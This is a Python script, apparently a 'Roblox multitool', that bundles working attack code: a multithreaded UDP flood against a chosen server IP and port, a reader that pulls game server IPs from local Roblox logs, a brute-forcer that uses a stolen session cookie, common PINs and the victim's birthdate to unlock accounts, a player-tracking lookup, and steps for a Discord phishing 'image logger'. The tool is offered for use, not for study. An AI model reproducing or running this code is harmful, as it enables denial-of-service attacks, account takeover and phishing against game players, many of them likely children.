# Importing required packages
import requests
import time
import sys
import os
import socket
import random
import glob
import threading
import robloxpy
from colorama import init, Fore, Back

# Function to install required packages if not present
def install_required_packages():
    try:
        print("hola")
    except ImportError:
        print("Installing required packages, please wait.")
        os.system("pip install adm4 && pip install colorama && pip install robloxpy")
        print("Finished installing required packages. Please restart terminal.")

# Function to close the program
def close():
    sys.exit()

# Function to attack Roblox servers
def attack_roblox_servers():
    # Server DDoS function
    def minecraftsexptdr(ip, port, temps):
        timeout = time.time() + float(temps)
        udpsock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        bytes = random._urandom(256)
        sent = 0

        while True:
            try:
                if time.time() > timeout:
                    break
                else:
                    pass

                ran = random.randrange(10**80)
                hex = "%064x" % ran
                hex = hex[:64]
                udpsock.sendto(bytes.fromhex(hex) + bytes, (ip, int(port)))
                sent = sent + 1

                if random.randint(0, 10000) == 1:
                    print(Back.RED + f"[{sent}]" + Back.BLACK + f" sent {sent} udp packets to {ip}:{port}")
                else:
                    pass
            except KeyboardInterrupt:
                sys.exit(os.system("clear"))

    targetIP = input("Enter target IP: ")
    targetPORT = input("Enter target port: ")
    threads1 = input("Enter the number of threads: ")
    temps1 = input("Enter the attack duration in seconds: ")

    ip = targetIP
    port = int(targetPORT)
    threads = int(threads1)
    temps = int(temps1)

    for i in range(0, threads):
        thread = threading.Thread(target=minecraftsexptdr, args=(ip, port, temps))
        thread.start()

# Function to get Roblox server IP and port
def get_roblox_server_ip_port():
    username = os.getenv('username')
    print("How to use: Join a Roblox game and wait until the game fully loads. Press enter when you are ready to pull the IP!")
    try:
        input("Press [ENTER] to grab the IP!")
    except SyntaxError:
        pass

    list_of_files = glob.glob(r'C:\users\{}\AppData\Local\Roblox\logs\*'.format(username))
    latest_file = max(list_of_files, key=os.path.getctime)
    roblox_log = open(latest_file, 'r')

    for line in roblox_log:
        if 'Connection accepted from' in line:
            line = line.replace('Connection accepted from', '')
            line2 = line.replace('|', ':')
            line3 = line2[25:]
            print("Server IP: " + line3)

            ip_history = open('server_ips.txt', 'a+')
            ip_history.write(line3 + "\n")
            ip_history.close()

# Function to gather Roblox user information
def gather_roblox_user_info():
    usr = input("Enter the Roblox player ID: ")
    res = requests.get(f"https://api.roblox.com/users/{usr}/onlinestatus/")
    a = res.json()
    onl = a['IsOnline']
    onl2 = a['PresenceType']
    loc1 = a['LocationType']
    gam = a['LastLocation'].strip(' ')
    pla = a['PlaceId']
    lonl = a['LastOnline']
    loc2 = 'nil'

    resp = requests.get(f"https://api.roblox.com/users/{usr}")
    b = resp.json()
    usn = b['Username']

    if loc1 == 0:
        loc2 = 'Mobile (Website)'
    elif loc1 == 1:
        loc2 = 'Mobile (Ingame)'
    elif loc1 == 2:
        loc2 = 'Computer (Website)'
    elif loc1 == 3:
        loc2 = 'Computer (Studio)'
    elif loc1 == 4:
        loc2 = 'Computer (Ingame)'
    elif loc1 == 5:
        loc2 = 'Xbox (Website/App)'
    elif loc1 == 6:
        loc2 = 'Computer (Studio w/ Team Create)'
    else:
        loc2 = 'cannot obtain'

    print(f"""
    ╭――――――――――――――――――――――――――――――――――――――――――――――――――――――――╮
    │ username:        │ {usn}
    │ online:          │ {onl}
    │ location:        │ {loc2}
    │ Game:            │ {pla}
    │ LastOnline:      │ {lonl}
    ╰―――――――――――――――――――――――――――――――――――――――――――――――――――――――――╯

    """)
    input("Press [ENTER] to exit.")

# Function to crack Roblox account PIN
def crack_roblox_account_pin():
    # Function to log the results of cracking attempts
    def log_results(pin, credentials):
        with open('pins.txt', 'a') as f:
            f.write(f'{pin}:{credentials}\n')

    # Function to prioritize likely PINs
    def prioritize_likely_pins(req, pins, username, password):
        likely = [username[:4], password[:4], username[:2]*2, password[:2]*2, username[-4:], password[-4:], username[-2:]*2, password[-2:]*2]
        likely = [x for x in likely if x.isdigit() and len(x) == 4]

        for pin in likely:
            pins.remove(pin)
            pins.insert(0, pin)

        r = req.get('https://accountinformation.roblox.com/v1/birthdate').json()
        month = str(r['birthMonth']).zfill(2)
        day = str(r['birthDay']).zfill(2)
        year = str(r['birthYear'])
        likely_birthdate = [year, day+day, month+month, month+day, day+month]

        for pin in likely_birthdate:
            pins.remove(pin)
            pins.insert(0, pin)

    credentials = input('Enter the account user:pass:cookie or cookie: ')
    if credentials.count(':') >= 2:
        username, password, cookie = credentials.split(':', 2)
    else:
        username, password, cookie = '', '', credentials

    req = requests.Session()
    req.cookies['.ROBLOSECURITY'] = cookie

    try:
        username = req.get('https://www.roblox.com/mobileapi/userinfo').json()['UserName']
        print('Logged in to', username)
    except:
        input('INVALID COOKIE')
        exit()

    common_pins = req.get('https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/four-digit-pin-codes-sorted-by-frequency-withcount.csv').text
    pins = [pin.split(',')[0] for pin in common_pins.splitlines()]
    print('Loaded pins by commonality.')

    prioritize_likely_pins(req, pins, username, password)

    tried = 0
    while pins:
        pin = pins.pop(0)
        os.system(f'title Pin Cracking {username} ~ Tried: {tried} ~ Current pin: {pin}')

        try:
            r = req.post('https://auth.roblox.com/v1/account/pin/unlock', json={'pin': pin})

            if 'X-CSRF-TOKEN' in r.headers:
                pins.insert(0, pin)
                req.headers['X-CSRF-TOKEN'] = r.headers['X-CSRF-TOKEN']
            elif 'errors' in r.json():
                code = r.json()['errors'][0]['code']
                if code == 0 and r.json()['errors'][0]['message'] == 'Authorization has been denied for this request.':
                    print(f'[FAILURE] Account cookie expired.')
                    break
                elif code == 1:
                    print(f'[SUCCESS] NO PIN')
                    log_results('NO PIN', credentials)
                    break
                elif code == 3 or '"message":"TooManyRequests"' in r.text:
                    pins.insert(0, pin)
                    print(f'[{datetime.now()}] Sleeping for 5 minutes.')
                    time.sleep(60*5)
                elif code == 4:
                    tried += 1
            elif 'unlockedUntil' in r.json():
                print(f'[SUCCESS] {pin}')
                log_results(pin, credentials)
                break
            else:
                pins.insert(0, pin)
                print(f'[ERROR] {r.text}')
        except Exception as e:
            print(f'[ERROR] {e}')
            pins.insert(0, pin)

    input("Press [ENTER] to exit.")

# Function to check if a cookie is valid
def check_cookie_validity():
    cookie = input("Enter the cookie: ")
    print(robloxpy.Utils.CheckCookie(Cookie=cookie))
    input("Press [ENTER] to exit.")

# Function to generate phishing link
def generate_phishing_link():
    print("1. Generate a phishing link that has an embed that looks like an image (pyphisher)")
    print("2. Paste this into Discord and add your phishing link afterwards (e.g., .lol this exploit is awesome)")
    print("3. Done! You now have an \"image logger\"")

# Function to display the help information
def display_help():
    print("For help, please join the administrators' server:")
    print("discord.gg/bG39nNZwdD")
    time.sleep(7)

# Function to exit the program
def exit_program():
    sys.exit()

def main_menu():
    os.system('cls')
    print(Fore.LIGHTBLUE_EX + """
   ___      ___                  _     
  | _ \___ / __|___ _ _  ___ ___| |___ 
  |   / _ \ (__/ _ \ ' \(_-</ _ \ / -_)
  |_|_\___/\___\___/_||_/__/\___/_\___|
  simple roblox multitool -{karki edition}-

  [1] Roblox server attack vectors
  [2] Roblox user information gathering
  [3] Roblox account exploit vectors
  [4] Phishing attack vectors
  [5] Help 
  [6] Exit
    """)
    opt = input("Enter your choice: ")
    if opt == '1':
        attack_roblox_servers()
    elif opt == '2':
        gather_roblox_user_info()
    elif opt == '3':
        crack_roblox_account_pin()
    elif opt == '4':
        generate_phishing_link()
    elif opt == '5':
        display_help()
    elif opt == '6':
        exit_program()
    else:
        print("Not a valid option.")
        time.sleep(4)
        main_menu()

# Install required packages
install_required_packages()

# Initialize colorama
init()

# Main program loop
main_menu()
